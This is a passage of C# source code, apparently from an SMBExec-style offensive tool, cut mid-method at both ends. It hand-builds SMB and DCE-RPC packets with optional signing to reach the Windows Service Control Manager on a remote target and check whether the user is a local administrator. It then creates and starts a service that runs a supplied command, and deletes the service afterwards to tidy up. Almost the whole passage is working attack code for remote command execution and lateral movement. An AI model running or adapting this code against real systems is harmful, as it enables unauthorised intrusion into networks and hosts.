                                        Packet_RPC_Data = SMBExec.RPCBind(1, new byte[] { 0xb8, 0x10 }, new byte[] { 0x01 }, new byte[] { 0x00, 0x00 }, SMB_named_pipe_UUID, new byte[] { 0x02, 0x00 });
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        Packet_SMB_Data = SMBExec.SMBWriteAndXRequest(SMB_FID, RPC_Data.Length);
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        int RPC_Data_Length = SMB_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, RPC_Data_Length);

                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).ToArray();

                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }

                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).ToArray();
                                        SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "ReadAndXRequest";
                                        SMB_Client_Stage_Next = "OpenSCManagerW";
                                    }
                                    break;
                                case "ReadAndXRequest":
                                    {
                                        Thread.Sleep(sleep * 1000);
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x2e }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBExec.SMBReadAndXRequest(SMB_FID);
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, SMB_Data.Length);
                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature2 = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature2;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                        SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = SMB_Client_Stage_Next;
                                    }
                                    break;

                                case "OpenSCManagerW":
                                    {
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }

                                        Packet_SCM_Data = SMBExec.SCMOpenSCManagerW(SMB_Service_Bytes, SMB_Service_Length);
                                        SCM_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SCM_Data);
                                        Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_Data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0f, 0x00 }, null);
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBExec.SMBWriteAndXRequest(SMB_FID, (RPC_Data.Length + SCM_Data.Length));
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        int RPC_Data_Length = SMB_Data.Length + SCM_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, RPC_Data_Length);

                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                        SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "ReadAndXRequest";
                                        SMB_Client_Stage_Next = "CheckAccess";
                                    }
                                    break;
                                case "CheckAccess":
                                    {
                                        if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 108, 111)) == "00-00-00-00" && BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 88, 107)) != "00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00")
                                        {
                                            SMB_Service_Manager_Context_Handle = Utilities.GetByteRange(SMBClientReceive, 88, 107);
                                            if (SMB_execute)
                                            {
                                                Packet_SCM_Data = SMBExec.SCMCreateServiceW(SMB_Service_Manager_Context_Handle, SMB_Service_Bytes, SMB_Service_Length, SMBExec_Command, SMBExec_Command_Length_bytes);
                                                SCM_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SCM_Data);
                                                if (SCM_Data.Length < SMB_Split_Index)
                                                {
                                                    SMBClientStage = "CreateServiceW";
                                                }
                                                else
                                                {
                                                    SMBClientStage = "CreateServiceW_First";
                                                }
                                            }
                                            else
                                            {
                                                output.AppendLine(String.Format("{0} is a local administrator on {1}", Output_Username, Target));
                                                SMB_Close_Service_Handle_Stage = 2;
                                                SMBClientStage = "CloseServiceHandle";
                                            }

                                        }
                                        else if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 108, 111)) == "05-00-00-00")
                                        {
                                            output.AppendLine(String.Format("{0} is not a local administrator or does not have the required privileges on {1}", Output_Username, Target));
                                            return output.ToString();
                                        }
                                        else
                                        {
                                            if (debug)
                                            {
                                                output.AppendLine(BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 108, 111)));
                                                output.AppendLine(BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 88, 107)));
                                            }
                                            output.AppendLine(String.Format("Something went wrong with {0}", Target));
                                            return output.ToString();
                                        }

                                    }

                                    break;

                                case "CreateServiceW":
                                    {
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }

                                        Packet_SCM_Data = SMBExec.SCMCreateServiceW(SMB_Service_Manager_Context_Handle, SMB_Service_Bytes, SMB_Service_Length, SMBExec_Command, SMBExec_Command_Length_bytes);
                                        SCM_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SCM_Data);
                                        Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_Data.Length, 0, 0, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, null);
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBExec.SMBWriteAndXRequest(SMB_FID, RPC_Data.Length + SCM_Data.Length);
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        int RPC_Data_Length = SMB_Data.Length + SCM_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, RPC_Data_Length);

                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                        SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "ReadAndXRequest";
                                        SMB_Client_Stage_Next = "StartServiceW";
                                    }
                                    break;
                                case "CreateServiceW_First":
                                    {
                                        SMB_Split_Stage_final = Math.Ceiling((double)SCM_Data.Length / SMB_Split_Index);
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }
                                        byte[] SCM_Data_First = Utilities.GetByteRange(SCM_Data, 0, SMB_Split_Index - 1);
                                        Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x01 }, 0, 0, 0, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_Data_First);
                                        Packet_RPC_Data["RPCRequest_AllocHint"] = BitConverter.GetBytes(SCM_Data.Length);
                                        SMB_Split_Index_Tracker = SMB_Split_Index;
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBExec.SMBWriteAndXRequest(SMB_FID, RPC_Data.Length);
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        int RPC_Data_Length = SMB_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, RPC_Data_Length);

                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).ToArray();
                                        SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                        if (SMB_Split_Stage_final <= 2)
                                        {
                                            SMBClientStage = "CreateServiceW_Last";
                                        }
                                        else
                                        {
                                            SMB_Split_Stage = 2;
                                            SMBClientStage = "CreateServiceW_Middle";
                                        }
                                    }
                                    break;
                                case "CreateServiceW_Middle":
                                    {
                                        SMB_Split_Stage++;
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }
                                        byte[] SCM_Data_Middle = Utilities.GetByteRange(SCM_Data, SMB_Split_Index_Tracker, SMB_Split_Index_Tracker + SMB_Split_Index - 1);
                                        SMB_Split_Index_Tracker += SMB_Split_Index;
                                        Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x00 }, 0, 0, 0, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_Data_Middle);
                                        Packet_RPC_Data["RPCRequest_AllocHint"] = BitConverter.GetBytes(SCM_Data.Length - SMB_Split_Index_Tracker + SMB_Split_Index);
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBExec.SMBWriteAndXRequest(SMB_FID, RPC_Data.Length);
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        int RPC_Data_Length = SMB_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, RPC_Data_Length);

                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).ToArray();
                                        SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                        if (SMB_Split_Stage >= SMB_Split_Stage_final)
                                        {
                                            SMBClientStage = "CreateServiceW_Last";
                                        }
                                        else
                                        {
                                            SMBClientStage = "CreateServiceW_Middle";
                                        }

                                    }
                                    break;

                                case "CreateServiceW_Last":
                                    {
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x48 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }
                                        byte[] SCM_Data_Last = Utilities.GetByteRange(SCM_Data, SMB_Split_Index_Tracker, SCM_Data.Length);
                                        SMB_Split_Index_Tracker += SMB_Split_Index;
                                        Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x02 }, 0, 0, 0, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_Data_Last);
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBExec.SMBWriteAndXRequest(SMB_FID, RPC_Data.Length);
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        int RPC_Data_Length = SMB_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, RPC_Data_Length);

                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).ToArray();
                                        SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "ReadAndXRequest";
                                        SMB_Client_Stage_Next = "StartServiceW";
                                    }
                                    break;

                                case "StartServiceW":
                                    {
                                        if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 112, 115)) == "00-00-00-00")
                                        {
                                            SMB_Service_Context_Handle = Utilities.GetByteRange(SMBClientReceive, 92, 111);
                                            Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);
                                            if (SMB_Signing)
                                            {
                                                Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_Signing_Counter += 2;
                                                SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                                Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                            }
                                            Packet_SCM_Data = SMBExec.SCMStartServiceW(SMB_Service_Context_Handle);
                                            SCM_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SCM_Data);
                                            Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_Data.Length, 0, 0, new byte[] { 0x03, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x13, 0x00 }, null);
                                            RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                            Packet_SMB_Data = SMBExec.SMBWriteAndXRequest(SMB_FID, RPC_Data.Length + SCM_Data.Length);
                                            SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                            int RPC_Data_Length = SMB_Data.Length + SCM_Data.Length + RPC_Data.Length;
                                            NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, RPC_Data_Length);

                                            if (SMB_Signing)
                                            {
                                                SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                                SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                                SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                                Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature;
                                                SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                            }
                                            SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                            SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                            SMBClientStage = "ReadAndXRequest";
                                            SMB_Client_Stage_Next = "DeleteServiceW";
                                        }
                                        else if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 112, 115)) == "31-04-00-00")
                                        {
                                            output.AppendLine(String.Format("Service {0} creation failed on {1}", SMB_Service, Target));
                                            return output.ToString();
                                        }
                                        else
                                        {
                                            output.AppendLine("Service Creation Fault Context Mismatch");
                                            return output.ToString();
                                        }
                                    }
                                    break;
                                case "DeleteServiceW":
                                    {
                                        if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 88, 91)) == "1D-04-00-00")
                                        {
                                            if (debug) { output.AppendLine(String.Format("Command Executed with ServiceName: {0} on {1}", SMB_Service, Target)); }
                                        }
                                        else if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 88, 91)) == "02-00-00-00")
                                        {
                                            SMBExec_Failed = true;
                                            if (debug) { output.AppendLine(String.Format("Service {0} failed to start on {1}", SMB_Service, Target)); }
                                        }
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);

                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }

                                        Packet_SCM_Data = SMBExec.SCMDeleteServiceW(SMB_Service_Context_Handle);
                                        SCM_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SCM_Data);
                                        Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_Data.Length, 0, 0, new byte[] { 0x04, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x02, 0x00 }, null);
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBExec.SMBWriteAndXRequest(SMB_FID, RPC_Data.Length + SCM_Data.Length);
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        int RPC_Data_Length = SMB_Data.Length + SCM_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, RPC_Data_Length);

                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                        SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "ReadAndXRequest";
                                        SMB_Client_Stage_Next = "CloseServiceHandle";
                                        SMB_Close_Service_Handle_Stage = 1;
                                    }
                                    break;
                                case "CloseServiceHandle":
                                    {
                                        Packet_SCM_Data = new OrderedDictionary();
                                        if (SMB_Close_Service_Handle_Stage == 1)
                                        {
                                            if (debug) { output.AppendLine(String.Format("Service {0} deleted on {1}", SMB_Service, Target)); }
                                            Service_Deleted = true;
                                            SMB_Close_Service_Handle_Stage++;
                                            Packet_SCM_Data = SMBExec.SCMCloseServiceHandle(SMB_Service_Context_Handle);
                                        }
                                        else
                                        {
                                            SMBClientStage = "CloseRequest";
                                            Packet_SCM_Data = SMBExec.SCMCloseServiceHandle(SMB_Service_Manager_Context_Handle);
                                        }
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);

                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }
                                        SCM_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SCM_Data);
                                        Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_Data.Length, 0, 0, new byte[] { 0x05, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, null);
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBExec.SMBWriteAndXRequest(SMB_FID, RPC_Data.Length + SCM_Data.Length);
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        int RPC_Data_Length = SMB_Data.Length + SCM_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, RPC_Data_Length);

                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                        SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                    }
                                    break;
                                case "CloseRequest":
                                    {
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x04 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);

                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBExec.SMBCloseRequest(new byte[] { 0x00, 0x40 });
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, SMB_Data.Length);

                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                        SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "TreeDisconnect";
                                    }
                                    break;
                                case "TreeDisconnect":
                                    {
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x71 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);

                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBExec.SMBTreeDisconnectRequest();
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, SMB_Data.Length);


                                        if (SMB_Signing)
                                        {
